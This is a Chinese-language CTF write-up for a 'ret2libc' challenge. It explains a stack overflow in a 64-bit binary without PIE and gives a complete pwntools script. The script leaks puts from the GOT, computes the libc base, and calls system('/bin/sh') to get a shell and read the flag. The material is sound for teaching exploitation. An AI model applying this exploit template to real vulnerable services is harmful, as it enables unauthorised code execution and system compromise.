# ret2libc

## 题目简述

64 位 ELF 未启用 PIE，`vuln()` 在 `0x20` 字节栈缓冲区中读取 `0x100` 字节，可覆盖返回地址；栈偏移为 `0x28`。附件同时提供匹配的 libc，先用 `puts@plt` 泄露 `puts@got` 中的运行时地址，再计算 libc 基址并调用 `system("/bin/sh")`。

## 解题过程

动态链接函数第一次解析后，其真实 libc 地址会写入 GOT；PLT 则提供程序内稳定的调用入口。

二进制中的稳定地址为：

```text
vuln      = 0x401205
puts@plt  = 0x401070
puts@got  = 0x404018
pop rdi   = 0x4012c3
ret       = 0x401235
offset    = 0x28
```

第一阶段构造：

```text
padding | pop rdi; ret | puts@got | puts@plt | vuln
```

`puts(puts@got)` 会把 GOT 槽内的地址按字节输出，随后返回 `vuln` 接收第二次溢出。利用附件 libc 的符号偏移计算：

$$
\text{libc\_base}=\text{puts\_leak}-\operatorname{offset}_{libc}(puts)
$$

完整脚本如下：

```python
from pwn import ELF, ROP, context, flat, remote, u64

context(arch="amd64", os="linux")

elf = ELF("./pwn", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
rop = ROP(elf)

io = remote("HOST", PORT)
offset = 0x28
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
ret = rop.find_gadget(["ret"]).address

stage1 = flat(
    b"A" * offset,
    pop_rdi,
    elf.got["puts"],
    elf.plt["puts"],
    elf.symbols["vuln"],
)
io.sendafter(b"Does a dynamic doll need libc ?\n", stage1)

puts_address = u64(io.recvline().rstrip(b"\n").ljust(8, b"\x00"))
libc.address = puts_address - libc.symbols["puts"]

system = libc.symbols["system"]
bin_sh = next(libc.search(b"/bin/sh\x00"))

stage2 = flat(
    b"B" * offset,
    pop_rdi,
    bin_sh,
    ret,       # 保持 system 入口处 16 字节栈对齐
    system,
)
io.sendafter(b"Does a dynamic doll need libc ?\n", stage2)
io.sendline(b"cat /flag")
io.interactive()
```

压缩附件不包含比赛环境的 `/flag`，因此不能从本地文件补写具体字符串；脚本取得 shell 后，当前实例的 `cat /flag` 输出即为最终结果。

## 方法总结

ret2libc 的标准两阶段流程是：利用程序内 PLT/GOT 泄露一个已解析 libc 符号，依据配套 libc 计算基址，再调用 `system` 和 libc 内的 `/bin/sh`。必须使用附件 libc，并注意 amd64 调用前的栈对齐。
